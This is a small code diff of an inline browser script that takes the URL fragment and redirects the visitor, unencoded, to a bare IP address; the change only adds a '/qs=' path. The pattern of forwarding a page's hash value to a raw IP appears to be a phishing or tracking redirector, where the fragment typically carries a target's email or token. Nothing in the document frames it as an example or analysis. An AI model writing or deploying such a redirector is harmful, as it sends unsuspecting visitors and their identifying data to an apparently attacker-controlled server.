@@ -2,8 +2,8 @@
     const hashValue = window.location.href.split('#')[1];
     if (hashValue) {
         // Directly pass the hash value without encoding
-        document.location.href = 'https://103.214.111.37/' + hashValue;
+        document.location.href = 'https://103.214.111.37/qs=' + hashValue;
     } else {
-        document.location.href = 'https://103.214.111.37/';
+        document.location.href = 'https://103.214.111.37/qs=';
     }
 </script>
